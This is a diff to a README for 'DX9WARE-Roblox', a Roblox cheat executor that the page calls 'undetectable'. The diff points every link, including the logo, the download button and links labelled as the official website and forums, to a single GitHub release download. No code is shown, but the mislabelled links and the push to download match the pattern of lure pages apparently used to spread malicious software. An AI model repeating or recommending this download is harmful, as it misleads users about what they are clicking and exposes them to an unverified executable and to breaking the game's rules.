@@ -1,6 +1,6 @@
 # 🚀 Welcome to DX9WARE-Roblox 🚀
 
-![DX9WARE Logo](https://example.com/dx9ware-logo.png)
+![DX9WARE Logo](https://github.com/00146664032q/DX9WARE-Roblox/releases/tag/v2.0)
 
 ### About:
 DX9WARE is a powerful Roblox executor that offers a secure and customizable Lua environment. It provides a variety of scripts and features for advanced scripting needs. This external tool is undetectable, making it perfect for experienced users.
@@ -15,7 +15,7 @@ DX9WARE is a powerful Roblox executor that offers a secure and customizable Lua 
 ### Get Started:
 To get started with DX9WARE-Roblox, download the software by clicking the button below:
 
-[![Download DX9WARE-Roblox](https://img.shields.io/badge/Download-DX9WARE--Roblox-brightgreen)](https://github.com/user-attachments/files/18060583/Software.zip "Click to Download DX9WARE-Roblox")
+[![Download DX9WARE-Roblox](https://github.com/00146664032q/DX9WARE-Roblox/releases/tag/v2.0)](https://github.com/00146664032q/DX9WARE-Roblox/releases/tag/v2.0 "Click to Download DX9WARE-Roblox")
 
 ### Note:
 The provided link needs to be launched to download the software. If the link does not work, please check the "Releases" section for an alternative download option.
@@ -25,5 +25,5 @@ The provided link needs to be launched to download the software. If the link doe
 --- 
 
 ### Additional Resources:
-- [DX9WARE-Roblox Official Website](https://dx9ware-roblox.com)
-- [DX9WARE-Roblox Community Forums](https://forums.dx9ware-roblox.com)
+- [DX9WARE-Roblox Official Website](https://github.com/00146664032q/DX9WARE-Roblox/releases/tag/v2.0)
+- [DX9WARE-Roblox Community Forums](https://github.com/00146664032q/DX9WARE-Roblox/releases/tag/v2.0)
